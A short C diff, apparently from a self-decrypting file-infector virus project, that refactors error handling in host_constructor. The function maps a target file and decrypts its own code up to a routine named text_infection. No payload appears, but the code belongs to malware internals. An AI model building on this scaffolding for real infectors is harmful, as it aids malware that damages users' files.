@@ -10,20 +10,11 @@ void host_constructor(struct s_host *host, struct s_keychain *keychain, const ch
 	struct stat statbuf;
 
 	if ((fd = open(filename, O_RDONLY, 0000)) < 0)
-	{
-		perror("open");
-		exit(1);
-	}
+		goto label_error;
 	if (stat(filename, &statbuf) < 0)
-	{
-		perror("stat");
-		exit(1);
-	}
+		goto label_error;
 	if ((host->header = mmap(NULL, statbuf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
-	{
-		perror("mmap");
-		exit(1);
-	}
+		goto label_error;
 
 	host->filename = filename;
 	host->filesize = statbuf.st_size;
@@ -33,6 +24,9 @@ void host_constructor(struct s_host *host, struct s_keychain *keychain, const ch
 	update_keychain_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
 	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
 
-	printf("host\n\n");
 	criteria(host, keychain);
+
+label_error:
+	printf("error\n");
+	exit(1);
 }
